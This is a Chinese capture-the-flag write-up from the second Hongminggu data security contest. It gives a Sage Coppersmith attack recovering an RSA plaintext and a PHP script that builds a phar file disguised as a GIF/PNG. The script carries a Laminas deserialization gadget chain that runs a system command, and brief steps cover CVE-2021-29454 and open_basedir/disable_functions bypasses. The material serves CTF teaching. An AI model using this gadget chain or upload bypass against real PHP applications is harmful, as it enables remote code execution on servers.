# 【WP】第二届“红明谷”杯数据安全大赛题目解析（一）

> 原文: https://www.ctfiot.com/32078.html
> ID: 32078

分析源码可以得到rsa 加密的密文c,及其对应的公钥(n,e)和一个512位的素数r，以及M = m%r

加密前的明文是在末尾填充了32位随机字符串的，由于m = M+k*r 首先尝试爆破k，但是我们会发现并不能爆破出来，这时候考虑 k的大小 由于 m的位数约为 591 位，而 r的位数为512位，则k的位数约为 79位。显然k相对来说比较小（但是爆破是不可行的）

我们考虑使用coopersmith 的方法寻找小根k。可以构造如下的多项式：f = (M+x*r)^e -c 在 Zmod(n)的多项式环上有小根x = k,由于k < 2^79 < n^(1/e) 所以我们可以迅速的找到k，恢复m

春秋GAME伽玛实验室

会定期分享赛题赛制设计、解题思路……

如果你日常有一些技术研究和好的设计思路

或在赛后对某道题有另辟蹊径的想法

欢迎找到春秋GAME投稿哦～

‍联系vx:
cium0309

欢迎加入 春秋GAME CTF交流2群

Q群:
703460426‍


```
1. rsa
2. coopersmith
#!sage
r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473
M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558
n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287
e = 3
c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282
P.<x> = PolynomialRing(Zmod(n))
f = (M+x*r)^e - c
k = f.monic().small_roots(X=2^100,beta=1,espilon=0.03)[0]
m = M+k*r
print(bytes.fromhex(hex(m)[2:]))
1.phar文件内容上传绕过
2.phar反序列化(Laminas链子利用)
<?php

namespace LaminasViewResolver{
    class TemplateMapResolver{
        protected $map = ["setBody"=>"system"];
    }
}
namespace LaminasViewRenderer{
    class PhpRenderer{
        private $__helpers;
        function __construct(){
            $this->__helpers = new LaminasViewResolverTemplateMapResolver();
        }
    }
}

namespace LaminasLogWriter{
    abstract class AbstractWriter{}

    class Mail extends AbstractWriter{
        protected $eventsToMail = ["cat /flag"];          //  cmd  cmd cmd
        protected $subjectPrependText = null;
        protected $mail;
        function __construct(){
            $this->mail = new LaminasViewRendererPhpRenderer();
        }
    }
}

namespace LaminasLog{
    class Logger{
        protected $writers;
        function __construct(){
            $this->writers = [new LaminasLogWriterMail()];
        }
    }
}
namespace{
    use LaminasLogLogger;
    $phar = new Phar("ttpfx.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a" . "<script language='php'>__HALT_COMPILER();</script>"); //设置stub
    $o = new Logger();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", file_get_contents("test.txt"));
    //$phar->addFromString("test.txt", "test");
    //签名自动计算
    $phar->stopBuffering();
    system("gzip ttpfx.phar");
    rename("ttpfx.phar.gz", "ttpfx.png");
}
?>
1.对比官方源码和题目的修改部分(这里其实从题目描述也能看出来)
2.绕过 open_dasedir 或 disable_functions 来读取到flag
1.CVE-2021-29454 的利用
2.绕过 open_dasedir 或 disable_functions 来读取到flag
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/9-1648081702.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/2-1648081702.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/8-1648081703.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/0-1648081704.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/10-1648081704.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/9-1648081705.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/3-1648081705.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/2-1648081706.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/0-1648081707.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/8-1648081707.png)